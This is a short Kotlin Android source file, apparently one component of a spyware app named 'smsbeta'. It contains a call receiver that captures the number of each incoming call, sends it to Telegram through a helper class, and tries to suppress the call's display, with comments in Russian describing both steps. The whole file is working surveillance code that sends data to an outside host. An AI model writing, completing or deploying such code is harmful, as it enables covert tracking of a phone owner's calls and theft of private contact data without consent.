package com.analyzer.smsbeta

// 3. CallReceiver.kt
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager

class CallReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            if (state == TelephonyManager.EXTRA_STATE_RINGING) {
                val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

                // Отправка данных в Telegram
                incomingNumber?.let {
                    TelegramSender.sendToTelegram("Входящий звонок от: $it")
                }

                // Блокировка отображения звонка
                resultData = null
            }
        }
    }
}